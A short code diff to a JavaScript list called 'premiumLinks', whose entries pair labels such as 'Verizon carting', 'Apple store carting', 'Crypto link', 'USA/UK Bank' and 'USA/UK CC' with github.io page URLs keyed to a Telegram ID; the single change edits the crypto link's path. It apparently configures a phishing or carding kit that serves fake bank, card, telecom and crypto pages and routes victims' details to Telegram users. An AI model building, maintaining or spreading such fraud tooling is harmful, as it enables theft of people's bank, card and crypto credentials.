@@ -17,7 +17,7 @@ const premiumLinks = [
           { name: "Verizon carting", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRyVhEfLAUC8Nd7bQfXbAW5XCOHJdnoXKNDQQ&s", urlTemplate: "https://amayointelligent68-hub.github.io/nt/veri.html?id={telegram-id}" },
         { name: "Lyca mobile", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRUp7KlMZp8Ku7g8SKFuiMSPIG68Hk-gZKttH0JweQENQ&s", urlTemplate: "https://amayointelligent68-hub.github.io/nt/ly.html?id={telegram-id}" },
         { name: "Apple store carting", image: "https://i.ibb.co/5hBt5hMv/Background-Eraser-20251204-212533709.png", urlTemplate: "https://amayointelligent68-hub.github.io/nt/aps.html?id={telegram-id}" },
-      { name: "Crypto link", image: "https://bbott52.github.io/Mobixhub/cr.png", urlTemplate: "https://fliacrypnloi.github.io/pm/nb/tr.html?id={telegram-id}" },
+      { name: "Crypto link", image: "https://bbott52.github.io/Mobixhub/cr.png", urlTemplate: "https://fliacrypnloi.github.io/pm/nb?id={telegram-id}" },
       { name: "USA/UK Bank", image: "https://bbott52.github.io/Mobixhub/us.png", urlTemplate: "https://fliacrypnloi.github.io/pm/nb/nbb/usb.html?id={telegram-id}" },
       { name: "USA/UK Bank and CC", image: "https://bbott52.github.io/Mobixhub/uk.png", urlTemplate: "https://fliacrypnloi.github.io/pm/Mobixhub?promo={telegram-id}" },
       { name: "USA/UK CC", image: "https://bbott52.github.io/Mobixhub/cc.png", urlTemplate: "https://fliacrypnloi.github.io/pm/Mobixhub?promo={telegram-id}" },
